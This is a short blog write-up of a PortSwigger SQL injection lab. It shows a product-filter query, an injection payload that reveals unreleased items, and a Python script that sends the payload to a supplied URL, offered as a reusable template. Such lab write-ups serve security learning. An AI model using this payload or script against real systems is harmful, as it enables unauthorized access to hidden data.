+++
date = '2026-06-03T14:31:16+08:00'
draft = false
title = 'SQL injection vulnerability in WHERE clause allowing retrieval of hidden data'
tags = ['training', 'PortSwigger', 'writeups', 'web-exploitation']
description = ''
showLastUpdated = true
+++
We know that the application carry out the following query:
```sql
SELECT * FROM products WHERE category = 'Gifts' AND released = 1
```
To view all the unreleased product, my payload is:
```
Pets' OR 1=1 AND released = 0--
```
The `1=1` expression ensures the application displays every category. Thus the query shall be:
```sql
SELECT * FROM products WHERE category = 'Pets' OR 1=1 AND released = 0--' AND released = 1
```

Alternatively, we can "automate" this with the following Python script. This can serve as a barebone template for future use:
```python
import webbrowser
import requests
import sys
import urllib.parse

def inject(url):
    # Remove trailing slash
    url = url.rstrip("/")
    
    # Preparing payload
    payload = "Pets' OR 1=1 AND released = 0--"
    url = f"{url}/filter"
    params = {"category": payload}
    
    # Initiate request
    response = requests.get(url, params=params)
    
    # Verify status code and open the webpage
    if response.status_code == 200:
        webbrowser.open(f"{url}?{urllib.parse.urlencode(params)}")
    else:
        print("Cannot initiate request")    
    
if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: python3 {sys.argv[0]} <url>")
        sys.exit(1)
    inject(sys.argv[1])
```